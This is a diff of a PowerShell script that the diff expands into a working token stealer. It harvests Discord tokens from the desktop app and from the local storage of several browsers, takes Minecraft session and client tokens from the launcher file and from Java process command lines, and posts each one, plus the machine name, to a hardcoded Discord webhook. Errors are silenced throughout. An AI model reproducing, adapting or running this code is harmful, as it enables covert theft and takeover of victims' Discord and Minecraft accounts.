@@ -1,30 +1,92 @@
 $webhookUrl = "https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
 
-Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
-    Select-Object -ExpandProperty CommandLine |
-    ForEach-Object {
-        $accessToken = $null
-        $username = $null
+function Send-Discord {
+    param($content)
+    $payload = @{ content = $content } | ConvertTo-Json
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+    } catch {}
+}
 
-        if ($_ -match '--accessToken\s+(\S+)') {
-            $accessToken = $matches[1]
-        }
-        if ($_ -match '--username\s+(\S+)') {
-            $username = $matches[1]
-        }
+# ========== DISCORD APP TOKENS ==========
+$appPaths = @(
+    "$env:LOCALAPPDATA\Discord\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\discordptb\Local Storage\leveldb"
+)
 
-        if ($accessToken -and $username) {
-            $message = @"
-> **AccessToken:** $accessToken
-> **Username:** $username
-"@
-
-            Write-Output $message
-
-            $payload = @{
-                content = $message
-            } | ConvertTo-Json -Depth 10
-
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
+foreach ($path in $appPaths) {
+    if (Test-Path $path) {
+        Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
+            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+            if ($content) {
+                $matches = [regex]::Matches($content, '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')
+                foreach ($match in $matches) {
+                    Send-Discord "**[DISCORD APP TOKEN]**`n```$($match.Value)```"
+                    Start-Sleep -Milliseconds 200
+                }
+            }
         }
     }
+}
+
+# ========== BROWSER DISCORD TOKENS (Chrome, Edge, Brave, Opera, Vivaldi) ==========
+$browserPaths = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
+    "$env:APPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb"
+)
+
+foreach ($path in $browserPaths) {
+    if (Test-Path $path) {
+        Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
+            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+            if ($content) {
+                $matches = [regex]::Matches($content, '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')
+                foreach ($match in $matches) {
+                    Send-Discord "**[DISCORD BROWSER TOKEN]**`n```$($match.Value)```"
+                    Start-Sleep -Milliseconds 200
+                }
+            }
+        }
+    }
+}
+
+# ========== MINECRAFT SESSION TOKEN ==========
+$mcPath = "C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\launcher_profiles.json"
+if (Test-Path $mcPath) {
+    try {
+        $data = Get-Content $mcPath -Raw | ConvertFrom-Json
+        if ($data.accessToken) {
+            Send-Discord "**[MINECRAFT SESSION TOKEN]**`n```$($data.accessToken)```"
+        }
+        if ($data.selectedProfile -and $data.selectedProfile.name) {
+            Send-Discord "**[MINECRAFT USERNAME]**`n$($data.selectedProfile.name)"
+        }
+        if ($data.clientToken) {
+            Send-Discord "**[MINECRAFT CLIENT TOKEN]**`n```$($data.clientToken)```"
+        }
+    } catch {}
+}
+
+# ========== JAVA PROCESS TOKENS (Minecraft modded clients) ==========
+Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name='java.exe'" -ErrorAction SilentlyContinue |
+    Select-Object -ExpandProperty CommandLine |
+    ForEach-Object {
+        $line = $_
+        if ($line -match '--accessToken\s+(\S+)') {
+            $accessToken = $matches[1]
+            $username = ""
+            if ($line -match '--username\s+(\S+)') {
+                $username = $matches[1]
+            }
+            if ($accessToken) {
+                Send-Discord "**[JAVA PROCESS TOKEN - $username]**`n```$accessToken```"
+                Start-Sleep -Milliseconds 200
+            }
+        }
+    }
+
+Send-Discord "**[DONE]** Token grab completed on $env:COMPUTERNAME"
